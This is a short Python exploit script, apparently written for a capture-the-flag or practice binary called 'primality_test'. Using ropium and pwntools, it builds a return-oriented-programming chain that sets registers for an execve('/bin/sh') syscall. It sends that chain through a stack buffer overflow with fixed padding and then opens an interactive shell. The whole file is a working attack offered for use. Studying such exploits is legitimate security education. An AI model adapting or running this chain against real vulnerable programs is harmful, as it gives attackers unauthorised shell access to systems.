"""
Exploit write in Python with ropium and pwntools.
"""

from ropium import *
from pwn import *

file_path = './primality_test'

# List of gadgets extract with Ropper
INT = 0x08048607  # int 0x80;
BIN_SH = 0x08048991  # "/bin/sh"

# Specify compile architecture of binary and operating system
rop = ROPium(ARCH.X86)
rop.os = OS.LINUX

# Loading binary in Ropium
rop.load(file_path)

# Bytes that should not appear in the ropchain (0x0a = \n)
rop.bad_bytes = [0x0a]

'''
The follow instruction failed, Ropium doesn't allow to call a syscall directly
chain = rop.compile('sys_execve(0x08048991, 0, 0)')
'''

# Build ROP chain
chain = rop.compile('eax=0xb')
chain += rop.compile('ecx=0')
chain += rop.compile('ebx=' + str(BIN_SH))
chain += rop.compile('edx=0')

# Add padding for exploit
ropchain = b'A'*(0x4c + 4) + chain.dump('raw') + p32(INT)

# Executing the executable with ropchain as input
io = process([file_path])
io.sendlineafter(b'Enter a number: ', ropchain)
# To manually interact with the spawn shell
io.interactive()
